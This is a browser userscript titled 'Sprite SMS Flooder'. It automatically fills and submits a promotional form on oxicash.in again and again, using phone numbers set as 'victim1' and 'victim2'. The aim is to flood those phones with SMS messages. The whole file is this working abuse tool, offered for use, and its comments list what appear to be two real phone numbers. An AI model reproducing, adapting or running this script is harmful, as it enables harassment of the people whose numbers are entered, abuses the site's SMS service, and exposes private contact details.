// ==UserScript==
// @name           Sprite SMS Flooder
// @namespace      Vinayak Prabhu
// @description    Floods Mass SMS's :|
// @include        https://oxicash.in/Promo/Sprite/default.aspx
// @include        https://oxicash.in/Promo/Sprite/default1.aspx
// ==/UserScript==

var victim1="91"; // 919966957515
var victim2="91"; // 919966997274
var code="A12411261"; // Leave it as it is or enter a new code :| its upto you :|

/*-------------------------Don't Edit Anything Below!------------------------*/

if(document.location=="https://oxicash.in/Promo/Sprite/default.aspx")
{
	document.getElementById('TB_mobno').value=victim1;
	document.getElementById('TB_UCN').value=code;
	document.getElementById('BTN_submit').click();
	document.title="Sprite SMS Flooder By Vinayak!";
}

if(document.location=="https://oxicash.in/Promo/Sprite/default1.aspx")
{
	document.getElementById('TB_mobno').value=victim2;
	document.getElementById('TB_UCN').value=code;
	document.getElementById('BTN_submit').click();
	document.title="Sprite SMS Flooder By Vinayak!";
}

/*-----------------------------------END-------------------------------------*/